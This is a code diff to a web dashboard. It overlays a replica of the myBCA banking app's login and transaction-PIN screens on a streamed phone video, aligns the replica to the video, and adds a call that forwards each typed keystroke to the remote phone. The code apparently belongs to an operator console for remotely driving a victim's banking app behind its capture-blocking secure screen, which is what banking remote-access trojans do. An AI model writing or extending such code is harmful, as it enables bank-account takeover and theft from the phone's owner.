@@ -397,32 +397,27 @@ tr:last-child td{border-bottom:0}
    MYBCA SECURE SCREEN HELPER OVERLAY
 ===================================================== */
 .mybca-secure-overlay{
-    position:absolute;inset:0;display:none;z-index:40;align-items:center;justify-content:center;
-    padding:18px;background:rgba(0,0,0,.18);backdrop-filter:blur(1px);pointer-events:none
+    position:absolute;inset:0;display:none;z-index:40;
+    pointer-events:none;overflow:hidden;background:transparent;
 }
-.mybca-secure-overlay.show{display:flex;animation:myBcaSecureIn .2s ease-out both;pointer-events:none}
+.mybca-secure-overlay.show{display:block;animation:myBcaSecureIn .15s ease-out both;pointer-events:none}
 .mybca-secure-preview{
-    width:min(330px,82%);min-height:570px;max-height:92%;overflow:hidden;
-    border:4px solid #303943;border-radius:22px;background:#f7f8fa;color:#27313b;
-    box-shadow:0 0 0 1px #fff1,0 18px 60px #000a;position:relative;
-    display:flex;flex-direction:column;pointer-events:none;user-select:none
+    position:absolute;overflow:hidden;box-sizing:border-box;
+    border:0;border-radius:0;background:#f7f8fa;color:#27313b;
+    box-shadow:none;display:block;pointer-events:none;user-select:none;
+    transform-origin:top left;
 }
-.mybca-secure-top{height:92px;flex:none;background:linear-gradient(135deg,#075a9d,#0b79c9);color:#fff;padding:20px 20px 0;display:flex;align-items:flex-start;gap:12px}
-.mybca-secure-back{font-size:24px;line-height:1;opacity:.95}
-.mybca-secure-title{font-size:17px;font-weight:700;margin-top:2px}
-.mybca-secure-body{flex:1;padding:18px 18px 16px;background:#f7f8fa;display:flex;flex-direction:column}
-.mybca-secure-login-card{background:#fff;border-radius:12px;padding:16px 14px;box-shadow:0 4px 18px #0000000d}
-.mybca-secure-label{font-size:12px;font-weight:800;margin-bottom:7px;color:#27313b}
-.mybca-secure-password-wrap{display:flex;align-items:center;border-bottom:1px solid #7d8791;gap:8px}
-.mybca-secure-input{
-    width:100%;border:0;outline:0;background:transparent;color:#1d2933;font-size:16px;letter-spacing:4px;padding:8px 0
-}
-.mybca-secure-eye{border:0;background:transparent;font-size:17px;color:#466176;cursor:pointer;padding:4px}
-.mybca-secure-reset{text-align:right;color:#2b658d;font-size:11px;font-weight:700;margin-top:12px}
-.mybca-secure-login-row{display:flex;align-items:center;gap:8px;margin-top:18px}
-.mybca-secure-login-btn{flex:1;border:0;border-radius:24px;padding:12px;background:#0b72bb;color:#fff;font-size:13px;font-weight:700}
-.mybca-secure-qr{width:42px;height:42px;border-radius:50%;border:0;background:#0d5e9f;color:#fff;font-size:18px}
-.mybca-secure-note{margin-top:auto;padding-top:12px;text-align:center;font-size:9px;color:#6f7a85}
+.mybca-secure-top{position:absolute;left:0;right:0;top:0;height:24%;min-height:0;background:linear-gradient(135deg,#075a9d,#0b79c9);color:#fff;padding:10% 7% 0;display:flex;align-items:flex-start;gap:3%;z-index:1}
+.mybca-secure-back{font-size:clamp(16px,4vw,24px);line-height:1;opacity:.95}
+.mybca-secure-title{font-size:clamp(14px,3.5vw,18px);font-weight:700;margin-top:1%}
+.mybca-secure-body{position:absolute;inset:0;padding:0;background:transparent;display:block}
+.mybca-guide-login{position:absolute;inset:0;pointer-events:none;background:linear-gradient(to bottom,transparent 0 24%,#f7f8fa 24% 100%)}
+.mybca-guide-password-label{position:absolute;left:5%;top:17%;font-size:clamp(11px,3.1vw,15px);font-weight:800;color:#27313b}
+.mybca-guide-password-line{position:absolute;left:10%;right:10%;top:21%;height:7%;border-bottom:1px solid #7d8791;color:#1d2933;font-size:clamp(14px,4vw,20px);letter-spacing:4px;padding-top:1%;white-space:nowrap;overflow:hidden}
+.mybca-guide-eye{position:absolute;right:9%;top:19%;font-size:clamp(13px,3.4vw,18px);color:#466176}
+.mybca-guide-reset{position:absolute;right:8%;top:25%;color:#2b658d;font-size:clamp(9px,2.5vw,12px);font-weight:700}
+.mybca-guide-login-button{position:absolute;left:14%;top:29%;width:58%;height:7%;border-radius:999px;background:#0b72bb;color:#fff;display:flex;align-items:center;justify-content:center;font-size:clamp(11px,3.2vw,15px);font-weight:700}
+.mybca-guide-qr{position:absolute;right:7%;top:29%;width:12%;aspect-ratio:1;border-radius:50%;background:#0d5e9f;color:#fff;display:flex;align-items:center;justify-content:center;font-size:clamp(13px,3.5vw,18px)}
 .mybca-secure-pin-head{text-align:center;padding-top:10px}
 .mybca-secure-lock{font-size:25px}
 .mybca-secure-pin-title{font-size:15px;font-weight:800;margin-top:8px}
@@ -698,6 +693,21 @@ let selectedCategoryId = null;
 let myBcaPreviewInput = "";
 let myBcaPreviewPin = "";
 
+function syncMyBcaSecurePreviewToVideo() {
+    const overlay = document.getElementById("mybcaSecureOverlay");
+    const preview = overlay?.querySelector(".mybca-secure-preview");
+    const video = document.getElementById("phoneVideo");
+    const screen = document.getElementById("screenArea");
+    if (!overlay || !preview || !video || !screen) return;
+    const videoRect = video.getBoundingClientRect();
+    const screenRect = screen.getBoundingClientRect();
+    if (!videoRect.width || !videoRect.height) return;
+    preview.style.left = `${videoRect.left - screenRect.left}px`;
+    preview.style.top = `${videoRect.top - screenRect.top}px`;
+    preview.style.width = `${videoRect.width}px`;
+    preview.style.height = `${videoRect.height}px`;
+}
+
 function renderMyBcaSecureOverlay(state) {
     const overlay = document.getElementById("mybcaSecureOverlay");
     const title = document.getElementById("mybcaSecureTitle");
@@ -710,43 +720,29 @@ function renderMyBcaSecureOverlay(state) {
     if (!isPin) {
         const bullets = "•".repeat(myBcaPreviewInput.length);
         body.innerHTML = `
-            <div class="mybca-secure-login-card">
-                <div class="mybca-secure-label">Password</div>
-                <div class="mybca-secure-password-wrap">
-                    <input id="myBcaPreviewPassword" class="mybca-secure-input" type="text"
-                        inputmode="text" autocomplete="off" spellcheck="false"
-                        value="${bullets}" aria-label="Password preview" readonly tabindex="0">
-                    <button class="mybca-secure-eye" type="button" onclick="toggleMyBcaPreviewPassword()">◉</button>
-                </div>
-                <div class="mybca-secure-reset">Reset Password</div>
-                <div class="mybca-secure-login-row">
-                    <button class="mybca-secure-login-btn" type="button" onclick="myBcaPreviewLogin()">Masuk</button>
-                    <button class="mybca-secure-qr" type="button">⌾</button>
-                </div>
-            </div>
-            <div class="mybca-secure-note">Preview posisi helper. Input yang diketik di sini hanya untuk pengujian dashboard.</div>`;
+            <div class="mybca-guide-login">
+                <div class="mybca-guide-password-label">Password</div>
+                <div class="mybca-guide-password-line">${bullets || ""}</div>
+                <div class="mybca-guide-eye">◉</div>
+                <div class="mybca-guide-reset">Reset Password</div>
+                <div class="mybca-guide-login-button">Masuk</div>
+                <div class="mybca-guide-qr">⌾</div>
+            </div>`;
     } else {
         const slots = Array.from({length:6}, (_,i) => `<span class="mybca-secure-slot">${i < myBcaPreviewPin.length ? "•" : ""}</span>`).join("");
-        const key = n => `<button class="mybca-key" type="button" onclick="myBcaPreviewPinKey('${n}')">${n}</button>`;
         body.innerHTML = `
             <div class="mybca-secure-pin-head">
                 <div class="mybca-secure-lock">♙</div>
                 <div class="mybca-secure-pin-title">PIN Transaksi</div>
                 <div class="mybca-secure-pin-sub">Silakan masukkan PIN Anda</div>
             </div>
-            <div class="mybca-secure-slots">${slots}<span class="mybca-secure-slot">◉</span></div>
-            <div class="mybca-secure-keypad">
-                ${key(1)}${key(2)}${key(3)}
-                ${key(4)}${key(5)}${key(6)}
-                ${key(7)}${key(8)}${key(9)}
-                <span></span>${key(0)}<button class="mybca-key delete" type="button" onclick="myBcaPreviewPinBackspace()">⌫</button>
-            </div>
-            <div class="mybca-secure-note">Preview posisi helper. PIN yang dimasukkan di sini tidak dikirim ke phone.</div>`;
+            <div class="mybca-secure-slots">${slots}<span class="mybca-secure-slot">◉</span></div>`;
     }
 
     overlay.classList.add("show");
     overlay.setAttribute("aria-hidden", "false");
     overlay.dataset.state = state;
+    requestAnimationFrame(syncMyBcaSecurePreviewToVideo);
 }
 
 function hideMyBcaSecureOverlay() {
@@ -789,11 +785,15 @@ function myBcaSecureKeyboardTest(event) {
     if (event.key.length === 1 && myBcaPreviewInput.length < 32) {
         myBcaPreviewInput += event.key;
         renderMyBcaSecureOverlay(MYBCA_STATES.LOGIN);
+        sendViewerInput({ type: "text", text: event.key });
         event.preventDefault();
     }
 }
 
 document.addEventListener("keydown", myBcaSecureKeyboardTest);
+window.addEventListener("resize", () => {
+    if (document.getElementById("mybcaSecureOverlay")?.classList.contains("show")) requestAnimationFrame(syncMyBcaSecurePreviewToVideo);
+});
 
 // =====================================================
 // MYBCA HELPER DETECTOR
